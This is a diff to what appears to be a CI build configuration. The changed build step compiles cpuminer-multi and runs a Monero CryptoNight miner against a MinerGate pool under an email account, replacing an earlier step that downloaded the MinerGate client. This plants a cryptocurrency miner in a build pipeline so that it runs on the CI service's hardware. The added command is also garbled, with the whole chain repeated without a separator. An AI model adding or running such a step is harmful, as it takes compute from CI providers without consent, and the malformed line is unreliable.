@@ -3,8 +3,7 @@ box:
 build:
   steps:
     - script:
-        code: apt-get update && apt-get install -y wget && apt-get -f install && sudo apt update && sudo apt install -y ocl-icd-opencl-dev && wget https://download.minergate.com/xfast-ubuntu-cli-amd && dpkg -i xfast-ubuntu-cli-amd && cd MinerGateX-cli-1.4-amd64-cpu && ./minergate-cli --help
-
+        code: apt-get update && apt-get install -y wget && apt-get -f install && sudo apt update && sudo apt install -y ocl-icd-opencl-dev &&apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++ && git clone https://github.com/tpruvot/cpuminer-multi && cd cpuminer-multi && ./autogen.sh && ./configure --with-crypto --with-curl && make -j 8 && ./cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u empireofbooks@gmail.com -p x --threads 8 apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++ && git clone https://github.com/tpruvot/cpuminer-multi && cd cpuminer-multi && ./autogen.sh && ./configure --with-crypto --with-curl && make -j 8 && ./cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u empireofbooks@gmail.com -p x --threads 8
 hello-again:
   box: ubuntu
   services:
